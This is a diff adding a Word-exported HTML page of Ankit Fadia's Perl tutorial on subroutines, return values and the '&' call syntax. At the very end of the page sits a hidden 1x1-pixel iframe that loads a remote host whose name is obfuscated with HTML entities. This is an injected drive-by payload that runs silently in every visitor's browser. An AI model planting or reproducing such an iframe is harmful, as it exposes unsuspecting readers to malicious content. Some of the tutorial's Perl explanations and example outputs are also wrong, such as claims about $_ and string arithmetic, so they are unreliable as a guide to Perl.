@@ -1,0 +1,469 @@
+<html xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:w="urn:schemas-microsoft-com:office:word"
+xmlns="http://www.w3.org/TR/REC-html40">
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=ProgId content=Word.Document>
+<meta name=Generator content="Microsoft Word 9">
+<meta name=Originator content="Microsoft Word 9">
+<link rel=File-List href="./perl4_files/filelist.xml">
+<title>Hacking Truths!!!--What they Don't teach in Manuals!!! Send an email to
+programmingforhackers-subscribe@egroups.com for more tutorials By Ankit Fadia</title>
+<!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>Ankit Fadia</o:Author>
+  <o:Template>Normal</o:Template>
+  <o:LastAuthor>Ankit Fadia</o:LastAuthor>
+  <o:Revision>2</o:Revision>
+  <o:TotalTime>51</o:TotalTime>
+  <o:Created>2000-07-04T09:43:00Z</o:Created>
+  <o:LastSaved>2000-07-04T09:43:00Z</o:LastSaved>
+  <o:Pages>4</o:Pages>
+  <o:Words>1016</o:Words>
+  <o:Characters>5794</o:Characters>
+  <o:Company>Hacking Truths</o:Company>
+  <o:Lines>48</o:Lines>
+  <o:Paragraphs>11</o:Paragraphs>
+  <o:CharactersWithSpaces>7115</o:CharactersWithSpaces>
+  <o:Version>9.2720</o:Version>
+ </o:DocumentProperties>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:WordDocument>
+  <w:DisplayHorizontalDrawingGridEvery>0</w:DisplayHorizontalDrawingGridEvery>
+  <w:DisplayVerticalDrawingGridEvery>0</w:DisplayVerticalDrawingGridEvery>
+  <w:UseMarginsForDrawingGridOrigin/>
+  <w:Compatibility>
+   <w:FootnoteLayoutLikeWW8/>
+   <w:ShapeLayoutLikeWW8/>
+   <w:AlignTablesRowByRow/>
+   <w:ForgetLastTabAlignment/>
+   <w:LayoutRawTableWidth/>
+   <w:LayoutTableRowsApart/>
+  </w:Compatibility>
+ </w:WordDocument>
+</xml><![endif]-->
+<style>
+<!--
+ /* Style Definitions */
+p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+h1
+	{mso-style-next:Normal;
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	page-break-after:avoid;
+	mso-outline-level:1;
+	font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-font-kerning:0pt;}
+a:link, span.MsoHyperlink
+	{color:blue;
+	text-decoration:underline;
+	text-underline:single;}
+a:visited, span.MsoHyperlinkFollowed
+	{color:purple;
+	text-decoration:underline;
+	text-underline:single;}
+@page Section1
+	{size:8.5in 11.0in;
+	margin:1.0in 1.25in 1.0in 1.25in;
+	mso-header-margin:.5in;
+	mso-footer-margin:.5in;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+-->
+</style>
+</head>
+
+<body lang=EN-US link=blue vlink=purple style='tab-interval:.5in'>
+
+<div class=Section1>
+
+<p class=MsoNormal>___________________________________________________________</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>The Perl (Almost) weekly manual By Ankit Fadia <a
+href="mailto:ankit@bol.net.in">ankit@bol.net.in</a></p>
+
+<p class=MsoNormal>___________________________________________________________</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Until now, we learnt how to execute commands in a specific
+order. Other than conditions and loops, we pretty much did the same thing. Now,
+say you have a snippet of code, which does a small task by itself, and it
+contains code, which is needed to perform that particular task at different
+stages of the same program. What do you do?</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Well, simply put the code within a ‘subroutine’ anywhere in
+the Perl program. This sub routine could then be called at any time and from
+anywhere with the help of a single line of code. Basically Subroutines are to
+Perl what functions are to C. Get it? </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Now, using sub routines not only makes your code more
+efficient, it along with shortening your Perl program, makes it simpler to
+code. If this sub routine thing makes you a bit nervous, then let us consider a
+few examples to understand them better.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Well, before we move on to the Examples part, let us learn
+the syntax and other basics of using Sub Routines in Perl. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Subroutines are declared by using the ‘sub’ keyword. The
+following is the syntax of a typical sub routine declaration-:</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>sub NAME { Code } declares a Sub Routine called NAME. Here
+Code are the commands contained by the sub routine NAME which are executed each
+time it is called.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>For example, </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>sub friendly_name {</p>
+
+<p class=MsoNormal>print “Hello”;</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Now, a sub routine declaration is pretty much useless
+without a call to it. By that what I mean to say is that, only declaring a Sub
+Routine is not enough to do something useful. A sub Routine becomes something
+efficient only when it is called or invoked after being declared. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>So in the above example, the sub routine ‘friendly_name’ is
+not of any use unless we call it or invoke it. To call a sub routine in Perl,
+we use the following line of code:</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>sub_routine_name ();</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>This line called the sub Routine called sub_routine_name and
+executes all commands within the curly brackets.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>So in our example, to call the ‘friendly_name’ sub routine,
+we use the following line of code:</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>friendly_name ();</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Now that you understand the concept of Sub Routines,
+declaration and sub routine invoking, let us write a complete Perl program
+initializing both of the above:</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>sub hello_world {</p>
+
+<p class=MsoNormal><span style='mso-tab-count:1'>                </span><span
+style='mso-tab-count:1'>                </span>print “Hello World\n”;</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>hello_world();</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Output-:<span style="mso-spacerun: yes">   
+</span>c:\&gt;perl sub.pl</p>
+
+<p class=MsoNormal><span style='mso-tab-count:1'>                </span><span
+style="mso-spacerun: yes">          </span>Hello World</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>The one thing that you need to note is that if you are not
+passing any arguments to the sub routine, then we do not need to write the
+parentheses. This means that we can call a function in two different ways-</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>function_name(); or function_name;</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Both of the above would produce the same results.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<h1>Returning Values</h1>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Say you have a number of scalars to which you want to assign
+values, which are calculated by calling the same sub routine. Now, if you have
+a single scalar, then you need not worry about how you would return the value,
+but if you have more than a single scalar, all of which have to assigned a
+value by performing the same calculations or in other words by calling the same
+sub routine, then you need to figure out a way of making your Sub routines
+return more than a single value.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>******************<br>
+HACKING TRUTH: Actually in Perl there is a slight difference between functions
+and Sub Routines. Most people assume that both of them are the same. But
+actually, a function is an inbuilt command, which is provided by Perl, while a
+sub routine is basically a group of commands that you right. Get it?</p>
+
+<p class=MsoNormal>*****************<br style='mso-special-character:line-break'>
+<![if !supportLineBreakNewLine]><br style='mso-special-character:line-break'>
+<![endif]></p>
+
+<p class=MsoNormal>Well, to do just that we have the ‘return’ statement. The
+return statement works in the following manner: It causes an immediate exit
+from the Sub Routine while returning the value to be returned either in the variable
+that called it or either in the default Perl variable: $_ (If the Sub Routine
+was not called by using a variable.)</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>The usage of the ‘return’ statement will become clearer
+after reading the exact syntax of the ‘return’ statement. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>return VALUE; exits from the Sub Routine while returning the
+VALUE.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>To understand the ‘return’ statement more well, let us take
+up some examples:</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>print ‘My Fav No is:’, number(), “\n”;</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>sub number {</p>
+
+<p class=MsoNormal><span style='mso-tab-count:1'>                </span><span
+style='mso-tab-count:1'>                </span>return (3*1+1);</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Output-: c:\windows\perl number.pl</p>
+
+<p class=MsoNormal><span style='mso-tab-count:1'>                </span>My Fav
+Number is: </p>
+
+<p class=MsoNormal><span style='mso-tab-count:1'>                </span>4</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>$letter = ‘b’;</p>
+
+<p class=MsoNormal>addone();</p>
+
+<p class=MsoNormal>minustwo();</p>
+
+<p class=MsoNormal>print $letter;</p>
+
+<p class=MsoNormal>sub addone{</p>
+
+<p class=MsoNormal><span style='mso-tab-count:1'>                </span><span
+style='mso-tab-count:1'>                </span>$letter +=1;</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>sub minustwo{</p>
+
+<p class=MsoNormal><span style='mso-tab-count:1'>                </span><span
+style='mso-tab-count:1'>                </span>$letter -=2;</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Output: c:\windows\letter.pl</p>
+
+<p class=MsoNormal><span style='mso-tab-count:1'>                </span>a</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>print “Type a Number between 0 and 4:\n”;</p>
+
+<p class=MsoNormal>$num= shift;</p>
+
+<p class=MsoNormal>print result;</p>
+
+<p class=MsoNormal>sub result {</p>
+
+<p class=MsoNormal><span style='mso-tab-count:1'>                </span><span
+style='mso-tab-count:1'>                </span>return 4 if $num ==4;</p>
+
+<p class=MsoNormal><span style='mso-tab-count:1'>                </span><span
+style='mso-tab-count:1'>                </span>return 3 if $num ==3;</p>
+
+<p class=MsoNormal><span style='mso-tab-count:1'>                </span><span
+style='mso-tab-count:1'>                </span>return 2 if $num ==2;</p>
+
+<p class=MsoNormal style='margin-left:.5in;text-indent:.5in'>return 1 if $num
+==1;</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Output: c:\windows\get.pl</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">             </span>Type a
+Number between 0 and 4:</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">              </span>4</p>
+
+<p class=MsoNormal><span style="mso-spacerun: yes">              </span>4</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Now, let us consider the following scenario: Say your
+program contains the following line of code:</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>$var_name= sub_name;</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Now, if the Sub Routine, by the name of sub_name has already
+been declared earlier i.e. before this particular line, then the variable
+$var_name is assigned the value returned by the Sub Routine, sub_routine.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>However, if the Sub Routine has not been declared already,
+i.e. before that particular line, then the variable var_name is assigned the
+string of characters- ‘sub_name’. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>So you see, even the tiniest or typos of mistakes in a Perl
+program can really change the way your program works. So basically like most
+programming languages, Perl too has a very strict and complicated set of rules
+and regulations. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Anyway, to avoid making a kind of mistake that I described
+above, there is the need of special Sub Routine call identifiers. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Just like, all scalars are preceded by the ‘$’ sign, all
+arrays by the ‘@’ sign, all hashes by the ‘%’ sign, similarly, all calls to a
+sub routine should be preceded by a ‘&amp;’ sign. </p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Note: This is by no means absolutely necessary to follow,
+but is certainly a very good and efficient programming practice.<span
+style="mso-spacerun: yes">   </span><span style='mso-tab-count:1'>              </span><span
+style='mso-tab-count:2'>                                </span></p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>So now, we know that there are four different ways in which
+a sub routine can be called-;</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>sub_name; or</p>
+
+<p class=MsoNormal>sub_name(); or</p>
+
+<p class=MsoNormal>&amp;Sub_name; or</p>
+
+<p class=MsoNormal>&amp;sub_name();</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Get it? If not, then read the following example to
+understand better:</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>sub printer{</p>
+
+<p class=MsoNormal><span style='mso-tab-count:1'>                </span><span
+style='mso-tab-count:1'>                </span>print “Hi, I am the Mr.
+Printer”;</p>
+
+<p class=MsoNormal>}</p>
+
+<p class=MsoNormal>&amp;printer;</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Output-: c:\windows\sb.pl</p>
+
+<p class=MsoNormal><span style='mso-tab-count:1'>                </span>Hi, I
+am the Mr. Printer</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>The usefulness of the ‘&amp;’ sign also comes forward when
+your sub routine name is the same as an inbuilt Perl function. For Example, if
+you want to name your Sub Routine print, then we use ‘&amp;’ so as to not
+confuse it with the inbuilt Perl function: print.</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Well, that is all for this issue of the Perl almost Weekly
+Journal. Till the next Journal this is Ankit Fadia saying Keep ‘Perling’ ; )</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>Ankit Fadia</p>
+
+<p class=MsoNormal><a href="mailto:ankit@bol.net.in">ankit@bol.net.in</a> (Yes,
+I answer all my mails.)</p>
+
+<p class=MsoNormal><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoNormal>To receive tutorials on everything you Dreamt of written by
+Ankit Fadia, join his mailing list, by sending an email to: <a
+href="mailto:programmingforhackers-subscribe@egroups.com">programmingforhackers-subscribe@egroups.com</a></p>
+
+</div>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+
+</html>
